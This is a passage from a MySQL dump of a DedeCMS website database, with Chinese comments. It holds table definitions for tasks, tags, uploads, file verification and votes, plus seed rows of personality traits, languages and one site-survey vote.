(1, 'nature', '性格外向,性格内向,活泼开朗,沉默寡言,幽默,稳重,轻浮,冲动,坚强,脆弱,幼稚,成熟,能说会道,自私,真诚,独立,依赖,任性,自负,自卑,温柔体贴,神经质,拜金,小心翼翼,暴躁,倔强,逆来顺受,不拘小节,婆婆妈妈,交际广泛,豪爽,害羞,狡猾善变,耿直,虚伪,乐观向上,悲观消极,郁郁寡欢,孤僻,难以琢磨,胆小怕事,敢做敢当,助人为乐,老实,守旧,敏感,迟钝,武断,果断,优柔寡断,暴力倾向,刻薄,损人利己,附庸风雅,时喜时悲,患得患失,快言快语,豪放不羁,多愁善感,循规蹈矩'),
(2, 'language', '普通话,上海话,广东话,英语,日语,韩语,法语,意大利语,德语,西班牙语,俄语,阿拉伯语');

-- --------------------------------------------------------

--
-- 表的结构 `dede_sys_task`
--

CREATE TABLE IF NOT EXISTS `dede_sys_task` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `taskname` varchar(50) NOT NULL,
  `dourl` varchar(100) NOT NULL,
  `islock` tinyint(1) unsigned NOT NULL DEFAULT '0',
  `runtype` tinyint(1) unsigned NOT NULL DEFAULT '0',
  `runtime` varchar(10) DEFAULT '0000',
  `starttime` int(10) unsigned NOT NULL DEFAULT '0',
  `endtime` int(10) unsigned NOT NULL DEFAULT '0',
  `freq` tinyint(2) unsigned NOT NULL DEFAULT '0',
  `lastrun` int(10) unsigned NOT NULL DEFAULT '0',
  `description` varchar(250) NOT NULL,
  `parameter` text,
  `settime` int(10) unsigned NOT NULL DEFAULT '0',
  `sta` enum('运行','成功','失败') DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM DEFAULT CHARSET=gbk AUTO_INCREMENT=1 ;

-- --------------------------------------------------------

--
-- 表的结构 `dede_tagindex`
--

CREATE TABLE IF NOT EXISTS `dede_tagindex` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `tag` char(12) NOT NULL DEFAULT '',
  `typeid` smallint(5) unsigned NOT NULL DEFAULT '0',
  `count` int(10) unsigned NOT NULL DEFAULT '0',
  `total` int(10) unsigned NOT NULL DEFAULT '0',
  `weekcc` int(10) unsigned NOT NULL DEFAULT '0',
  `monthcc` int(10) unsigned NOT NULL DEFAULT '0',
  `weekup` int(10) unsigned NOT NULL DEFAULT '0',
  `monthup` int(10) unsigned NOT NULL DEFAULT '0',
  `addtime` int(10) unsigned NOT NULL DEFAULT '0',
  PRIMARY KEY (`id`)
) ENGINE=MyISAM DEFAULT CHARSET=gbk AUTO_INCREMENT=1 ;

-- --------------------------------------------------------

--
-- 表的结构 `dede_taglist`
--

CREATE TABLE IF NOT EXISTS `dede_taglist` (
  `tid` int(10) unsigned NOT NULL DEFAULT '0',
  `aid` int(10) unsigned NOT NULL DEFAULT '0',
  `arcrank` smallint(6) NOT NULL DEFAULT '0',
  `typeid` smallint(5) unsigned NOT NULL DEFAULT '0',
  `tag` varchar(12) NOT NULL DEFAULT '',
  PRIMARY KEY (`tid`,`aid`)
) ENGINE=MyISAM DEFAULT CHARSET=gbk;

-- --------------------------------------------------------

--
-- 表的结构 `dede_uploads`
--

CREATE TABLE IF NOT EXISTS `dede_uploads` (
  `aid` mediumint(8) unsigned NOT NULL AUTO_INCREMENT,
  `arcid` mediumint(8) unsigned NOT NULL DEFAULT '0',
  `title` char(60) NOT NULL DEFAULT '',
  `url` char(80) NOT NULL DEFAULT '',
  `mediatype` smallint(6) NOT NULL DEFAULT '1',
  `width` char(10) NOT NULL DEFAULT '',
  `height` char(10) NOT NULL DEFAULT '',
  `playtime` char(10) NOT NULL DEFAULT '',
  `filesize` mediumint(8) unsigned NOT NULL DEFAULT '0',
  `uptime` int(10) unsigned NOT NULL DEFAULT '0',
  `mid` mediumint(8) unsigned NOT NULL DEFAULT '0',
  PRIMARY KEY (`aid`),
  KEY `memberid` (`mid`),
  KEY `arcid` (`arcid`)
) ENGINE=MyISAM DEFAULT CHARSET=gbk AUTO_INCREMENT=1 ;

-- --------------------------------------------------------

--
-- 表的结构 `dede_verifies`
--

CREATE TABLE IF NOT EXISTS `dede_verifies` (
  `nameid` char(32) NOT NULL DEFAULT '',
  `cthash` varchar(32) NOT NULL DEFAULT '',
  `method` enum('local','official') NOT NULL DEFAULT 'official',
  `filename` varchar(254) NOT NULL DEFAULT '',
  PRIMARY KEY (`nameid`)
) ENGINE=MyISAM DEFAULT CHARSET=gbk;

-- --------------------------------------------------------

--
-- 表的结构 `dede_vote`
--

CREATE TABLE IF NOT EXISTS `dede_vote` (
  `aid` mediumint(8) unsigned NOT NULL AUTO_INCREMENT,
  `votename` varchar(50) NOT NULL DEFAULT '',
  `starttime` int(10) unsigned NOT NULL DEFAULT '0',
  `endtime` int(10) unsigned NOT NULL DEFAULT '0',
  `totalcount` mediumint(8) unsigned NOT NULL DEFAULT '0',
  `ismore` tinyint(6) NOT NULL DEFAULT '0',
  `votenote` text,
  PRIMARY KEY (`aid`)
) ENGINE=MyISAM  DEFAULT CHARSET=gbk AUTO_INCREMENT=2 ;

--
-- 转存表中的数据 `dede_vote`
--

INSERT INTO `dede_vote` (`aid`, `votename`, `starttime`, `endtime`, `totalcount`, `ismore`, `votenote`) VALUES
(1, '你是从哪儿得知本站的？', 1150646400, 1268928000, 8, 0, '<v:note id=''1'' count=''2''>朋友介绍</v:note>\r\n<v:note id=''2'' count=''0''>门户网站的搜索引擎</v:note>\r\n<v:note id=''3'' count=''2''>Google或百度搜索</v:note>\r\n<v:note id=''4'' count=''3''>别的网站上的链接</v:note>\r\n<v:note id=''5'' count=''1''>其它途径</v:note>\r\n');

/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
